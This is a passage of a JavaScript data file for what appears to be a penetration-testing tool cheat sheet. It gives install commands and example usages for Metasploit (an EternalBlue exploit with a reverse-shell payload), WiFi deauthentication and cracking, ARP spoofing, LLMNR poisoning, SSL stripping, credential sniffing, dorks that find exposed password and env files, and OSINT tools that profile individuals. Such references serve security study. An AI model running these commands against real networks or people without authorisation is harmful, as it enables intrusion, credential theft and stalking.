    {title:'Numbers',command:'crunch 4 6 0123456789 -o words.txt',explanation:'Numbers only',example:'crunch 4 6 0123456789 -o words.txt'},
    {title:'Alpha',command:'crunch 4 6 abcdefghijklmnopqrstuvwxyz -o words.txt',explanation:'Alpha',example:'crunch 4 6 abcdefghijklmnopqrstuvwxyz -o words.txt'},
    {title:'Alphanumeric',command:'crunch 8 8 abc123 -o words.txt',explanation:'Alphanum',example:'crunch 8 8 abc123 -o words.txt'}
  ]},

  // EXPLOITATION
  { name:'Metasploit', slug:'metasploit', category:'Exploitation', icon:'💥', difficulty:'advanced', shortDesc:'Penetration testing framework', description:'Metasploit is a pentesting framework.', installation:'sudo apt install metasploit-framework', syntax:'msfconsole', keywords:['exploit'], commands:[
    {title:'Launch',command:'msfconsole',explanation:'Open',example:'msfconsole'},
    {title:'Search',command:'search <keyword>',explanation:'Search',example:'search smb'},
    {title:'Use Module',command:'use <module>',explanation:'Select',example:'use exploit/windows/smb/ms17_010_eternalblue'},
    {title:'Show Options',command:'show options',explanation:'Options',example:'show options'},
    {title:'Set RHOSTS',command:'set RHOSTS <target>',explanation:'Target',example:'set RHOSTS 192.168.1.1'},
    {title:'Set LHOST',command:'set LHOST <ip>',explanation:'Local IP',example:'set LHOST 192.168.1.100'},
    {title:'Set Payload',command:'set PAYLOAD <payload>',explanation:'Payload',example:'set PAYLOAD windows/x64/meterpreter/reverse_tcp'},
    {title:'Run',command:'run',explanation:'Execute',example:'run',dangerous:true},
    {title:'Sessions',command:'sessions -l',explanation:'List sessions',example:'sessions -l'},
    {title:'Interact',command:'sessions -i <id>',explanation:'Interact',example:'sessions -i 1'}
  ]},
  { name:'Searchsploit', slug:'searchsploit', category:'Exploitation', icon:'🔎', difficulty:'beginner', shortDesc:'Exploit-DB offline search', description:'Searchsploit searches Exploit-DB.', installation:'sudo apt install exploitdb', syntax:'searchsploit <keyword>', keywords:['exploit'], commands:[
    {title:'Search',command:'searchsploit <keyword>',explanation:'Search',example:'searchsploit apache 2.4'},
    {title:'Exact Match',command:'searchsploit -e "<title>"',explanation:'Exact',example:'searchsploit -e "Apache 2.4.49"'},
    {title:'Copy',command:'searchsploit -m <id>',explanation:'Copy',example:'searchsploit -m 12345'},
    {title:'Update',command:'searchsploit -u',explanation:'Update',example:'searchsploit -u'}
  ]},
  { name:'ExploitDB', slug:'exploitdb', category:'Exploitation', icon:'📚', difficulty:'beginner', shortDesc:'Exploit database', description:'ExploitDB is an exploit archive.', installation:'sudo apt install exploitdb', syntax:'searchsploit', keywords:['exploit'], commands:[
    {title:'Update',command:'searchsploit -u',explanation:'Update',example:'searchsploit -u'}
  ]},
  { name:'Beef', slug:'beef', category:'Exploitation', icon:'🐂', difficulty:'advanced', shortDesc:'Browser exploitation framework', description:'Beef is a browser exploitation framework.', installation:'sudo apt install beef-xss', syntax:'beef-xss', keywords:['xss','browser'], commands:[
    {title:'Launch',command:'beef-xss',explanation:'Start Beef',example:'beef-xss',dangerous:true}
  ]},
  { name:'Empire', slug:'empire', category:'Exploitation', icon:'👑', difficulty:'advanced', shortDesc:'PowerShell post-exploitation', description:'Empire is a PowerShell post-exploitation framework.', installation:'git clone https://github.com/BC-SECURITY/Empire', syntax:'./empire', keywords:['powershell'], commands:[
    {title:'Launch',command:'./empire',explanation:'Start',example:'./empire',dangerous:true}
  ]},
  { name:'Sliver', slug:'sliver', category:'Exploitation', icon:'🥈', difficulty:'advanced', shortDesc:'C2 framework', description:'Sliver is a general purpose C2 framework.', installation:'Download from GitHub', syntax:'sliver-server', keywords:['c2'], commands:[
    {title:'Launch',command:'sliver-server',explanation:'Start',example:'sliver-server',dangerous:true}
  ]},

  // WIRELESS SECURITY
  { name:'Aircrack-ng', slug:'aircrack-ng', category:'Wireless Security', icon:'📶', difficulty:'intermediate', shortDesc:'WiFi security auditing suite', description:'Aircrack-ng is a WiFi security suite.', installation:'sudo apt install aircrack-ng', syntax:'aircrack-ng [options]', keywords:['wifi'], commands:[
    {title:'Monitor Mode',command:'sudo airmon-ng start wlan0',explanation:'Monitor mode',example:'sudo airmon-ng start wlan0'},
    {title:'Scan',command:'sudo airodump-ng wlan0mon',explanation:'Scan',example:'sudo airodump-ng wlan0mon'},
    {title:'Capture Handshake',command:'sudo airodump-ng -c <channel> --bssid <bssid> -w capture wlan0mon',explanation:'Capture',example:'sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon'},
    {title:'Deauth',command:'sudo aireplay-ng -0 10 -a <bssid> wlan0mon',explanation:'Deauth',example:'sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon',dangerous:true},
    {title:'Crack WPA',command:'aircrack-ng -w rockyou.txt capture.cap',explanation:'Crack WPA',example:'aircrack-ng -w rockyou.txt capture.cap',dangerous:true},
    {title:'Crack WEP',command:'aircrack-ng -b <bssid> capture.cap',explanation:'Crack WEP',example:'aircrack-ng -b AA:BB:CC:DD:EE:FF capture.cap',dangerous:true}
  ]},
  { name:'Airgeddon', slug:'airgeddon', category:'Wireless Security', icon:'🎯', difficulty:'intermediate', shortDesc:'Wireless attack suite', description:'Airgeddon is a wireless attack script.', installation:'sudo apt install airgeddon', syntax:'sudo airgeddon', keywords:['wifi'], commands:[
    {title:'Launch',command:'sudo airgeddon',explanation:'Menu',example:'sudo airgeddon',dangerous:true}
  ]},
  { name:'Kismet', slug:'kismet', category:'Wireless Security', icon:'📡', difficulty:'advanced', shortDesc:'Wireless detector/sniffer', description:'Kismet is a wireless detector.', installation:'sudo apt install kismet', syntax:'sudo kismet', keywords:['wifi'], commands:[
    {title:'Launch',command:'sudo kismet',explanation:'Start',example:'sudo kismet'}
  ]},
  { name:'Reaver', slug:'reaver', category:'Wireless Security', icon:'🔓', difficulty:'advanced', shortDesc:'WPS brute force', description:'Reaver attacks WPS PINs.', installation:'sudo apt install reaver', syntax:'reaver -i <iface> -b <bssid>', keywords:['wps'], commands:[
    {title:'Attack',command:'sudo reaver -i wlan0mon -b <bssid> -vv',explanation:'WPS attack',example:'sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv',dangerous:true}
  ]},
  { name:'Wifite', slug:'wifite', category:'Wireless Security', icon:'📻', difficulty:'intermediate', shortDesc:'Automated WiFi attack', description:'Wifite automates WiFi attacks.', installation:'sudo apt install wifite', syntax:'sudo wifite', keywords:['wifi'], commands:[
    {title:'Launch',command:'sudo wifite',explanation:'Menu',example:'sudo wifite',dangerous:true}
  ]},
  { name:'Fern WiFi Cracker', slug:'fern-wifi-cracker', category:'Wireless Security', icon:'🌿', difficulty:'intermediate', shortDesc:'GUI WiFi cracker', description:'Fern WiFi Cracker is a GUI wireless security tool.', installation:'sudo apt install fern-wifi-cracker', syntax:'sudo fern-wifi-cracker', keywords:['wifi'], commands:[
    {title:'Launch',command:'sudo fern-wifi-cracker',explanation:'GUI',example:'sudo fern-wifi-cracker',dangerous:true}
  ]},
  { name:'WiFite2', slug:'wifite2', category:'Wireless Security', icon:'📻', difficulty:'intermediate', shortDesc:'Automated WiFi tool', description:'Wifite2 is the successor of Wifite.', installation:'git clone https://github.com/derv82/wifite2', syntax:'sudo python3 Wifite.py', keywords:['wifi'], commands:[
    {title:'Launch',command:'sudo python3 Wifite.py',explanation:'Start',example:'sudo python3 Wifite.py',dangerous:true}
  ]},

  // OSINT
  { name:'Maltego', slug:'maltego', category:'OSINT', icon:'🕸️', difficulty:'intermediate', shortDesc:'OSINT and link analysis', description:'Maltego is a powerful OSINT and forensic link analysis tool.', installation:'Download from maltego.com', syntax:'maltego', keywords:['osint','graph'], commands:[
    {title:'Launch',command:'maltego',explanation:'Open GUI',example:'maltego'},
    {title:'CLI Mode',command:'maltego -cli',explanation:'CLI mode',example:'maltego -cli'}
  ]},
  { name:'SpiderFoot', slug:'spiderfoot', category:'OSINT', icon:'🕷️', difficulty:'intermediate', shortDesc:'Automated OSINT scanner', description:'SpiderFoot automates OSINT for threat intelligence.', installation:'sudo apt install spiderfoot', syntax:'spiderfoot -l 127.0.0.1:5001', keywords:['osint'], commands:[
    {title:'Web UI',command:'spiderfoot -l 127.0.0.1:5001',explanation:'Web UI',example:'spiderfoot -l 127.0.0.1:5001'},
    {title:'CLI Scan',command:'spiderfoot -s <target>',explanation:'CLI scan',example:'spiderfoot -s example.com'}
  ]},
  { name:'Sherlock', slug:'sherlock', category:'OSINT', icon:'🔎', difficulty:'beginner', shortDesc:'Hunt social media usernames', description:'Sherlock finds usernames across 400+ social networks.', installation:'pip install sherlock-project', syntax:'sherlock <username>', keywords:['osint','social','username'], commands:[
    {title:'Hunt Username',command:'sherlock <username>',explanation:'Find across sites',example:'sherlock john_doe'},
    {title:'Specific Sites',command:'sherlock <username> --site twitter --site github',explanation:'Specific sites',example:'sherlock john_doe --site twitter --site github'},
    {title:'Save to File',command:'sherlock <username> --output results.txt',explanation:'Save output',example:'sherlock john_doe --output results.txt'},
    {title:'Timeout',command:'sherlock <username> --timeout 10',explanation:'Custom timeout',example:'sherlock john_doe --timeout 10'},
    {title:'Tor Mode',command:'sherlock <username> --tor',explanation:'Via Tor',example:'sherlock john_doe --tor'}
  ]},
  { name:'Maigret', slug:'maigret', category:'OSINT', icon:'🕵️', difficulty:'beginner', shortDesc:'Username OSINT tool', description:'Maigret checks usernames across 2500+ sites.', installation:'pip install maigret', syntax:'maigret <username>', keywords:['osint','username'], commands:[
    {title:'Basic',command:'maigret <username>',explanation:'Find user',example:'maigret john_doe'},
    {title:'HTML Report',command:'maigret <username> --html',explanation:'HTML report',example:'maigret john_doe --html'},
    {title:'PDF Report',command:'maigret <username> --pdf',explanation:'PDF report',example:'maigret john_doe --pdf'}
  ]},
  { name:'Holehe', slug:'holehe', category:'OSINT', icon:'📮', difficulty:'beginner', shortDesc:'Check email on 120+ sites', description:'Holehe checks if an email is registered on 120+ sites.', installation:'pip install holehe', syntax:'holehe <email>', keywords:['osint','email'], commands:[
    {title:'Basic',command:'holehe <email>',explanation:'Check sites',example:'holehe test@gmail.com'},
    {title:'Only Used',command:'holehe <email> --only-used',explanation:'Only registered',example:'holehe test@gmail.com --only-used'}
  ]},
  { name:'GHunt', slug:'ghunt', category:'OSINT', icon:'🕵️', difficulty:'intermediate', shortDesc:'Google account OSINT', description:'GHunt investigates Google accounts.', installation:'pip install ghunt', syntax:'ghunt email <email>', keywords:['osint','google'], commands:[
    {title:'Email Lookup',command:'ghunt email <email>',explanation:'Email info',example:'ghunt email test@gmail.com'},
    {title:'GAIA Lookup',command:'ghunt gaia <gaia_id>',explanation:'GAIA ID',example:'ghunt gaia 1234567890'}
  ]},
  { name:'EmailHarvester', slug:'emailharvester', category:'OSINT', icon:'📧', difficulty:'beginner', shortDesc:'Email harvesting tool', description:'EmailHarvester finds emails from a domain.', installation:'pip install EmailHarvester', syntax:'EmailHarvester -d <domain>', keywords:['email','osint'], commands:[
    {title:'Basic',command:'EmailHarvester -d <domain>',explanation:'Harvest emails',example:'EmailHarvester -d example.com'},
    {title:'With Engines',command:'EmailHarvester -d <domain> -e google,bing',explanation:'Custom engines',example:'EmailHarvester -d example.com -e google,bing'}
  ]},
  { name:'SocialScan', slug:'socialscan', category:'OSINT', icon:'👤', difficulty:'beginner', shortDesc:'Check username/email availability', description:'SocialScan checks username and email availability.', installation:'pip install socialscan', syntax:'socialscan <target>', keywords:['osint'], commands:[
    {title:'Username',command:'socialscan <username>',explanation:'Check username',example:'socialscan john_doe'},
    {title:'Email',command:'socialscan <email>',explanation:'Check email',example:'socialscan test@gmail.com'}
  ]},
  { name:'Instaloader', slug:'instaloader', category:'OSINT', icon:'📸', difficulty:'beginner', shortDesc:'Instagram downloader', description:'Instaloader downloads Instagram posts, stories, profiles.', installation:'pip install instaloader', syntax:'instaloader <profile>', keywords:['instagram','osint'], commands:[
    {title:'Profile',command:'instaloader <profile>',explanation:'Download profile',example:'instaloader john_doe'},
    {title:'Stories',command:'instaloader --stories <profile>',explanation:'Stories',example:'instaloader --stories john_doe'},
    {title:'Posts Only',command:'instaloader --no-videos <profile>',explanation:'No videos',example:'instaloader --no-videos john_doe'}
  ]},
  { name:'Toutatis', slug:'toutatis', category:'OSINT', icon:'📱', difficulty:'beginner', shortDesc:'Instagram account info', description:'Toutatis extracts Instagram account info.', installation:'pip install toutatis', syntax:'toutatis -u <username>', keywords:['instagram','osint'], commands:[
    {title:'User Info',command:'toutatis -u <username>',explanation:'Get info',example:'toutatis -u john_doe'},
    {title:'Session ID',command:'toutatis -u <username> -s <session_id>',explanation:'With session',example:'toutatis -u john_doe -s ABC123'}
  ]},
  { name:'Twint', slug:'twint', category:'OSINT', icon:'🐦', difficulty:'intermediate', shortDesc:'Twitter scraping tool', description:'Twint is an advanced Twitter scraping tool.', installation:'pip install twint', syntax:'twint -u <username>', keywords:['twitter','osint'], commands:[
    {title:'User Tweets',command:'twint -u <username>',explanation:'Get tweets',example:'twint -u elonmusk'},
    {title:'Search Keyword',command:'twint -s "<keyword>"',explanation:'Search tweets',example:'twint -s "cybersecurity"'},
    {title:'Save to File',command:'twint -u <username> -o tweets.csv --csv',explanation:'Save CSV',example:'twint -u elonmusk -o tweets.csv --csv'}
  ]},
  { name:'PhoneInfoga', slug:'phoneinfoga', category:'OSINT', icon:'📞', difficulty:'intermediate', shortDesc:'Phone number OSINT', description:'PhoneInfoga scans phone numbers for OSINT.', installation:'Download from GitHub', syntax:'phoneinfoga scan -n <number>', keywords:['phone','osint'], commands:[
    {title:'Scan',command:'phoneinfoga scan -n <number>',explanation:'Scan number',example:'phoneinfoga scan -n "+919999999999"'},
    {title:'Local',command:'phoneinfoga scan -n <number> -l',explanation:'Local format',example:'phoneinfoga scan -n "+919999999999" -l'}
  ]},
  { name:'Ignorant', slug:'ignorant', category:'OSINT', icon:'📱', difficulty:'beginner', shortDesc:'Check phone on sites', description:'Ignorant checks if a phone number is registered on sites.', installation:'pip install ignorant', syntax:'ignorant <number> <country>', keywords:['phone'], commands:[
    {title:'Check',command:'ignorant <number> <country>',explanation:'Check',example:'ignorant 9999999999 IN'}
  ]},
  { name:'ExifTool', slug:'exiftool', category:'OSINT', icon:'📷', difficulty:'beginner', shortDesc:'Image metadata extractor', description:'ExifTool reads/writes metadata in images and media files.', installation:'sudo apt install libimage-exiftool-perl', syntax:'exiftool <file>', keywords:['image','metadata','osint'], commands:[
    {title:'Basic Info',command:'exiftool <image>',explanation:'All metadata',example:'exiftool photo.jpg'},
    {title:'GPS Location',command:'exiftool -gps:all <image>',explanation:'GPS coords',example:'exiftool -gps:all photo.jpg'},
    {title:'Camera Info',command:'exiftool -Make -Model <image>',explanation:'Camera',example:'exiftool -Make -Model photo.jpg'},
    {title:'Date Taken',command:'exiftool -DateTimeOriginal <image>',explanation:'Date',example:'exiftool -DateTimeOriginal photo.jpg'},
    {title:'All Files in Dir',command:'exiftool <dir>',explanation:'Dir scan',example:'exiftool /path/to/photos/'},
    {title:'CSV Export',command:'exiftool -csv <dir> > output.csv',explanation:'CSV export',example:'exiftool -csv /path/to/photos/ > output.csv'},
    {title:'Remove Metadata',command:'exiftool -all= <image>',explanation:'Strip metadata',example:'exiftool -all= photo.jpg'},
    {title:'Author Info',command:'exiftool -Artist -Copyright <image>',explanation:'Author',example:'exiftool -Artist -Copyright photo.jpg'}
  ]},
  { name:'Google Dorks', slug:'google-dorks', category:'OSINT', icon:'🔍', difficulty:'beginner', shortDesc:'Advanced Google search queries', description:'Google Dorks are advanced search queries for OSINT.', installation:'Browser based', syntax:'site: inurl: filetype:', keywords:['google','dork'], commands:[
    {title:'Login Pages',command:'site:example.com inurl:login',explanation:'Login pages',example:'site:example.com inurl:login'},
    {title:'PDF Files',command:'site:example.com filetype:pdf',explanation:'PDFs',example:'site:example.com filetype:pdf'},
    {title:'Open Directories',command:'intitle:"index of" site:example.com',explanation:'Open dirs',example:'intitle:"index of" site:example.com'},
    {title:'Admin Panels',command:'site:example.com inurl:admin',explanation:'Admin panels',example:'site:example.com inurl:admin'},
    {title:'Config Files',command:'site:example.com ext:xml | ext:conf | ext:cnf | ext:reg',explanation:'Configs',example:'site:example.com ext:xml'},
    {title:'Database Files',command:'site:example.com ext:sql | ext:dbf | ext:mdb',explanation:'DB files',example:'site:example.com ext:sql'},
    {title:'Env Files',command:'site:example.com ext:env',explanation:'Env files',example:'site:example.com ext:env'},
    {title:'Password Files',command:'site:example.com inurl:password',explanation:'Passwords',example:'site:example.com inurl:password'}
  ]},
  { name:'Shodan', slug:'shodan', category:'OSINT', icon:'🌐', difficulty:'beginner', shortDesc:'IoT search engine', description:'Shodan is a search engine for internet-connected devices.', installation:'pip install shodan', syntax:'shodan search <query>', keywords:['iot','search'], commands:[
    {title:'Search',command:'shodan search "<query>"',explanation:'Search devices',example:'shodan search "apache"'},
    {title:'Host Info',command:'shodan host <ip>',explanation:'Host info',example:'shodan host 8.8.8.8'},
    {title:'My IP',command:'shodan myip',explanation:'Your IP',example:'shodan myip'},
    {title:'Count',command:'shodan count "<query>"',explanation:'Result count',example:'shodan count "apache"'}
  ]},
  { name:'theHarvester Extended', slug:'theharvester-ext', category:'OSINT', icon:'📧', difficulty:'beginner', shortDesc:'Extended email harvester', description:'theHarvester with extended sources.', installation:'sudo apt install theharvester', syntax:'theHarvester -d <domain> -b <sources>', keywords:['email'], commands:[
    {title:'All Sources',command:'theHarvester -d <domain> -b all',explanation:'All',example:'theHarvester -d example.com -b all'},
    {title:'LinkedIn',command:'theHarvester -d <domain> -b linkedin',explanation:'LinkedIn',example:'theHarvester -d example.com -b linkedin'},
    {title:'Save Results',command:'theHarvester -d <domain> -b all -f output.html',explanation:'Save HTML',example:'theHarvester -d example.com -b all -f output.html'}
  ]},
  { name:'Steghide', slug:'steghide', category:'OSINT', icon:'🖼️', difficulty:'intermediate', shortDesc:'Steganography tool', description:'Steghide hides data in image/audio files.', installation:'sudo apt install steghide', syntax:'steghide [command] [options]', keywords:['stego','image'], commands:[
    {title:'Embed Data',command:'steghide embed -cf <image> -ef <file>',explanation:'Hide file',example:'steghide embed -cf photo.jpg -ef secret.txt'},
    {title:'Extract Data',command:'steghide extract -sf <image>',explanation:'Extract',example:'steghide extract -sf photo.jpg'},
    {title:'Info',command:'steghide info <image>',explanation:'Get info',example:'steghide info photo.jpg'}
  ]},
  { name:'Zsteg', slug:'zsteg', category:'OSINT', icon:'🎨', difficulty:'intermediate', shortDesc:'PNG/BMP steg detection', description:'Zsteg detects steganography in PNG/BMP images.', installation:'gem install zsteg', syntax:'zsteg <image>', keywords:['stego','png'], commands:[
    {title:'Scan',command:'zsteg <image>',explanation:'Full scan',example:'zsteg image.png'},
    {title:'All Bit Orders',command:'zsteg -a <image>',explanation:'All bits',example:'zsteg -a image.png'}
  ]},
  { name:'Strings', slug:'strings', category:'OSINT', icon:'📝', difficulty:'beginner', shortDesc:'Extract strings from binary', description:'Strings extracts printable text from binary files.', installation:'sudo apt install binutils', syntax:'strings <file>', keywords:['binary','strings'], commands:[
    {title:'Basic',command:'strings <file>',explanation:'All strings',example:'strings image.jpg'},
    {title:'Min Length',command:'strings -n 8 <file>',explanation:'Min 8 chars',example:'strings -n 8 image.jpg'},
    {title:'Search Pattern',command:'strings <file> | grep -i password',explanation:'Grep pattern',example:'strings image.jpg | grep -i password'}
  ]},

  // FORENSICS
  { name:'Autopsy', slug:'autopsy', category:'Forensics', icon:'🔬', difficulty:'intermediate', shortDesc:'Digital forensics platform', description:'Autopsy is a digital forensics platform.', installation:'sudo apt install autopsy', syntax:'autopsy', keywords:['forensics'], commands:[
    {title:'Launch',command:'autopsy',explanation:'Open GUI',example:'autopsy'}
  ]},
  { name:'Binwalk', slug:'binwalk', category:'Forensics', icon:'🔍', difficulty:'intermediate', shortDesc:'Firmware analysis tool', description:'Binwalk analyzes firmware images.', installation:'sudo apt install binwalk', syntax:'binwalk <file>', keywords:['firmware'], commands:[
    {title:'Scan',command:'binwalk <file>',explanation:'Scan',example:'binwalk firmware.bin'},
    {title:'Extract',command:'binwalk -e <file>',explanation:'Extract',example:'binwalk -e firmware.bin'},
    {title:'Entropy',command:'binwalk -E <file>',explanation:'Entropy analysis',example:'binwalk -E firmware.bin'},
    {title:'Recursive',command:'binwalk -Me <file>',explanation:'Recursive extract',example:'binwalk -Me firmware.bin'}
  ]},
  { name:'Foremost', slug:'foremost', category:'Forensics', icon:'🔄', difficulty:'intermediate', shortDesc:'File carving tool', description:'Foremost recovers deleted files.', installation:'sudo apt install foremost', syntax:'foremost -i <file> -o <outdir>', keywords:['carve'], commands:[
    {title:'Carve',command:'foremost -i <file> -o <outdir>',explanation:'Recover',example:'foremost -i disk.img -o output/'},
    {title:'By Type',command:'foremost -t jpg,pdf -i <file> -o <outdir>',explanation:'Specific types',example:'foremost -t jpg,pdf -i disk.img -o output/'}
  ]},
  { name:'Volatility', slug:'volatility', category:'Forensics', icon:'🧠', difficulty:'advanced', shortDesc:'Memory forensics', description:'Volatility is a memory forensics framework.', installation:'sudo apt install volatility', syntax:'volatility -f <dump> <plugin>', keywords:['memory'], commands:[
    {title:'Image Info',command:'volatility -f <dump> imageinfo',explanation:'Profile',example:'volatility -f mem.dump imageinfo'},
    {title:'Processes',command:'volatility -f <dump> --profile=<p> pslist',explanation:'Process list',example:'volatility -f mem.dump --profile=Win7SP1x64 pslist'},
    {title:'Network',command:'volatility -f <dump> --profile=<p> netscan',explanation:'Network',example:'volatility -f mem.dump --profile=Win7SP1x64 netscan'},
    {title:'Files',command:'volatility -f <dump> --profile=<p> filescan',explanation:'Files',example:'volatility -f mem.dump --profile=Win7SP1x64 filescan'},
    {title:'Registry',command:'volatility -f <dump> --profile=<p> hivelist',explanation:'Registry',example:'volatility -f mem.dump --profile=Win7SP1x64 hivelist'}
  ]},
  { name:'Testdisk', slug:'testdisk', category:'Forensics', icon:'💽', difficulty:'intermediate', shortDesc:'Data recovery tool', description:'Testdisk recovers lost partitions and files.', installation:'sudo apt install testdisk', syntax:'sudo testdisk', keywords:['recovery'], commands:[
    {title:'Launch',command:'sudo testdisk',explanation:'Interactive',example:'sudo testdisk'}
  ]},
  { name:'Sleuthkit', slug:'sleuthkit', category:'Forensics', icon:'🔬', difficulty:'advanced', shortDesc:'Disk forensics toolkit', description:'The Sleuth Kit is a collection of CLI forensics tools.', installation:'sudo apt install sleuthkit', syntax:'fls <image>', keywords:['forensics'], commands:[
    {title:'List Files',command:'fls -r <image>',explanation:'Recursive list',example:'fls -r disk.img'},
    {title:'File Info',command:'istat <image> <inode>',explanation:'Inode info',example:'istat disk.img 1234'},
    {title:'File Type',command:'file <image>',explanation:'File type',example:'file disk.img'}
  ]},
  { name:'Guymager', slug:'guymager', category:'Forensics', icon:'💾', difficulty:'intermediate', shortDesc:'Disk imaging GUI', description:'Guymager is a forensic disk imaging tool.', installation:'sudo apt install guymager', syntax:'sudo guymager', keywords:['imaging'], commands:[
    {title:'Launch',command:'sudo guymager',explanation:'GUI',example:'sudo guymager'}
  ]},

  // REVERSE ENGINEERING
  { name:'Ghidra', slug:'ghidra', category:'Reverse Engineering', icon:'🐲', difficulty:'advanced', shortDesc:'NSA RE framework', description:'Ghidra is an NSA reverse engineering framework.', installation:'sudo apt install ghidra', syntax:'ghidra', keywords:['reverse'], commands:[
    {title:'Launch',command:'ghidra',explanation:'GUI',example:'ghidra'},
    {title:'Headless',command:'ghidra <project> <binary>',explanation:'Headless',example:'ghidra myproject ./binary'}
  ]},
  { name:'Radare2', slug:'radare2', category:'Reverse Engineering', icon:'🔧', difficulty:'advanced', shortDesc:'RE framework', description:'Radare2 is a complete RE framework.', installation:'sudo apt install radare2', syntax:'r2 <binary>', keywords:['reverse'], commands:[
    {title:'Open',command:'r2 <binary>',explanation:'Open binary',example:'r2 /bin/ls'},
    {title:'Analyze',command:'aaa',explanation:'Auto analyze',example:'aaa'},
    {title:'List Functions',command:'afl',explanation:'Functions',example:'afl'},
    {title:'Disassemble',command:'pdf @ main',explanation:'Main func',example:'pdf @ main'},
    {title:'Strings',command:'iz',explanation:'Strings',example:'iz'},
    {title:'Hex Dump',command:'px 64 @ 0x0',explanation:'Hex dump',example:'px 64 @ 0x0'}
  ]},
  { name:'GDB', slug:'gdb', category:'Reverse Engineering', icon:'🐛', difficulty:'advanced', shortDesc:'GNU debugger', description:'GDB is the GNU Project debugger.', installation:'sudo apt install gdb', syntax:'gdb <binary>', keywords:['debug'], commands:[
    {title:'Open',command:'gdb <binary>',explanation:'Open',example:'gdb ./program'},
    {title:'Run',command:'run',explanation:'Run',example:'run'},
    {title:'Breakpoint',command:'break main',explanation:'Break',example:'break main'},
    {title:'Step',command:'step',explanation:'Step',example:'step'},
    {title:'Next',command:'next',explanation:'Next',example:'next'},
    {title:'Print Var',command:'print <var>',explanation:'Print',example:'print argc'},
    {title:'Info Registers',command:'info registers',explanation:'Registers',example:'info registers'}
  ]},
  { name:'Apktool', slug:'apktool', category:'Reverse Engineering', icon:'📱', difficulty:'intermediate', shortDesc:'Android APK reverse tool', description:'Apktool reverse engineers APKs.', installation:'sudo apt install apktool', syntax:'apktool d <apk>', keywords:['apk','android'], commands:[
    {title:'Decode',command:'apktool d <apk>',explanation:'Decode',example:'apktool d app.apk'},
    {title:'Build',command:'apktool b <dir>',explanation:'Rebuild',example:'apktool b app_folder'},
    {title:'Force Decode',command:'apktool d -f <apk>',explanation:'Force',example:'apktool d -f app.apk'}
  ]},
  { name:'Jadx', slug:'jadx', category:'Reverse Engineering', icon:'☕', difficulty:'intermediate', shortDesc:'Dex to Java decompiler', description:'Jadx decompiles Android APK to Java.', installation:'sudo apt install jadx', syntax:'jadx <apk>', keywords:['apk','decompile'], commands:[
    {title:'Decompile',command:'jadx <apk>',explanation:'Decompile',example:'jadx app.apk'},
    {title:'GUI',command:'jadx-gui <apk>',explanation:'GUI',example:'jadx-gui app.apk'}
  ]},
  { name:'Ltrace', slug:'ltrace', category:'Reverse Engineering', icon:'🔬', difficulty:'advanced', shortDesc:'Library call tracer', description:'Ltrace traces library calls.', installation:'sudo apt install ltrace', syntax:'ltrace <binary>', keywords:['trace'], commands:[
    {title:'Trace',command:'ltrace <binary>',explanation:'Trace calls',example:'ltrace ./program'}
  ]},
  { name:'Strace', slug:'strace', category:'Reverse Engineering', icon:'🔬', difficulty:'advanced', shortDesc:'System call tracer', description:'Strace traces system calls.', installation:'sudo apt install strace', syntax:'strace <binary>', keywords:['trace'], commands:[
    {title:'Trace',command:'strace <binary>',explanation:'Trace syscalls',example:'strace ./program'},
    {title:'Follow Forks',command:'strace -f <binary>',explanation:'Follow forks',example:'strace -f ./program'},
    {title:'To File',command:'strace -o trace.txt <binary>',explanation:'Save file',example:'strace -o trace.txt ./program'}
  ]},

  // SNIFFING / SPOOFING
  { name:'Responder', slug:'responder', category:'Sniffing / Spoofing', icon:'🎭', difficulty:'advanced', shortDesc:'LLMNR/NBT-NS poisoner', description:'Responder poisons LLMNR, NBT-NS, mDNS.', installation:'sudo apt install responder', syntax:'sudo responder -I <iface>', keywords:['mitm'], commands:[
    {title:'Run',command:'sudo responder -I eth0 -rdw',explanation:'Run',example:'sudo responder -I eth0 -rdw',dangerous:true},
    {title:'Analyze Only',command:'sudo responder -I eth0 -A',explanation:'Analyze',example:'sudo responder -I eth0 -A'}
  ]},
  { name:'MITMf', slug:'mitmf', category:'Sniffing / Spoofing', icon:'🎣', difficulty:'advanced', shortDesc:'MITM framework', description:'MITMf is a MITM framework.', installation:'git clone MITMf', syntax:'python mitmf.py [options]', keywords:['mitm'], commands:[
    {title:'ARP Spoof',command:'python mitmf.py --arp --spoof --gateway <gw> --target <t> -i eth0',explanation:'ARP',example:'python mitmf.py --arp --spoof --gateway 192.168.1.1 --target 192.168.1.5 -i eth0',dangerous:true}
  ]},
  { name:'dsniff', slug:'dsniff', category:'Sniffing / Spoofing', icon:'👃', difficulty:'advanced', shortDesc:'Network auditing toolkit', description:'dsniff is a collection of network auditing tools.', installation:'sudo apt install dsniff', syntax:'sudo dsniff -i <iface>', keywords:['sniff'], commands:[
    {title:'Sniff',command:'sudo dsniff -i eth0',explanation:'Sniff creds',example:'sudo dsniff -i eth0',dangerous:true}
  ]},
  { name:'SSLstrip', slug:'sslstrip', category:'Sniffing / Spoofing', icon:'🔓', difficulty:'advanced', shortDesc:'HTTPS downgrade attack', description:'SSLstrip downgrades HTTPS to HTTP.', installation:'sudo apt install sslstrip', syntax:'sslstrip -l <port>', keywords:['mitm'], commands:[
    {title:'Listen',command:'sslstrip -l 8080',explanation:'Start',example:'sslstrip -l 8080',dangerous:true}
  ]},
  { name:'Wireshark Sniff', slug:'wireshark-sniff', category:'Sniffing / Spoofing', icon:'🦈', difficulty:'intermediate', shortDesc:'Packet sniffer', description:'Wireshark for packet sniffing.', installation:'sudo apt install wireshark', syntax:'wireshark', keywords:['sniff'], commands:[
    {title:'Launch',command:'wireshark',explanation:'GUI',example:'wireshark'}
  ]},

  // VULNERABILITY ANALYSIS
  { name:'OpenVAS', slug:'openvas', category:'Vulnerability Analysis', icon:'🛡️', difficulty:'advanced', shortDesc:'Open vulnerability scanner', description:'OpenVAS is a vulnerability scanner.', installation:'sudo apt install openvas', syntax:'gvm-setup', keywords:['scanner'], commands:[
    {title:'Setup',command:'sudo gvm-setup',explanation:'Setup',example:'sudo gvm-setup'},
    {title:'Start',command:'sudo gvm-start',explanation:'Start',example:'sudo gvm-start'},
    {title:'Check',command:'sudo gvm-check-setup',explanation:'Verify',example:'sudo gvm-check-setup'}
  ]},
